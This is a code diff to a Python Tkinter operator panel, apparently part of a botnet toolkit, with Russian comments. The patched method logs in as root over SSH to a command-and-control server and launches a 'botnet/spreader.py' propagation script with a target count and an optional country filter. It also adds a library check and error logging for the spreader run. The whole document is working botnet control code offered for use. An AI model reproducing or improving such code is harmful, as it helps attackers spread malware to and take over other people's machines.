@@ -386,11 +386,23 @@ class BotnetTab(ttk.Frame):
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=5)
-                cmd = f"export SPREAD_COUNTRY={country}; cd /root/c2 && python3 -u botnet/spreader.py --count {count}"
+                # Проверяем наличие библиотек
+                check_libs = "python3 -c 'import paramiko, redis, docker, asyncssh' 2>&1 || echo 'Нет библиотек!'"
+                stdin, stdout, stderr = client.exec_command(check_libs)
+                libs_status = stdout.read().decode() + stderr.read().decode()
+                self.spread_log.insert(tk.END, f"Библиотеки: {libs_status}\n")
+                # Запускаем спредер напрямую, без screen, чтобы видеть вывод
+                cmd = f"cd /root/c2 && python3 -u botnet/spreader.py --count {count}"
+                if country:
+                    cmd = f"export SPREAD_COUNTRY={country}; {cmd}"
                 stdin, stdout, stderr = client.exec_command(cmd)
                 for line in iter(stdout.readline, ""):
                     self.spread_log.insert(tk.END, line)
                     self.spread_log.see(tk.END)
+                # Читаем stderr
+                errors = stderr.read().decode()
+                if errors:
+                    self.spread_log.insert(tk.END, f"[!] Ошибки:\n{errors}\n")
                 client.close()
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
